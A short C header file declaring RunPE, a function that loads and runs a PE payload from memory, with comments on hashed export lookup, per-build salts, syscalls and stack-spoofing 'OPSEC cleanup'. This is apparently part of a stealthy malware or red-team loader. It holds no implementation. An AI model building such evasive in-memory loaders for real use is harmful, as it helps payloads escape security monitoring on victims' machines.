#ifndef RUNPE_H
#define RUNPE_H

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Maps and executes a PE from memory in the current process.
 *
 * exportHash  — Djb2 hash of the DLL export to invoke after DllMain, seeded with exportSeed.
 *               Pass 0 to skip export invocation (always ignored for EXE payloads).
 * exportSeed  — per-build seed for Djb2 (key_salt[0] from .rsrc); eliminates FIXED_DJB2_SEED.
 * pExportArg  — null-terminated string passed to the export function, or NULL.
 * PreExecuteCb — called after all syscalls complete, just before handing over to the payload.
 *                Use for OPSEC cleanup (e.g., StackSpoof_Cleanup).
 */
DWORD RunPE(BYTE* pPeFile, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg, void (*PreExecuteCb)(void));

#ifdef __cplusplus
}
#endif

#endif /* RUNPE_H */
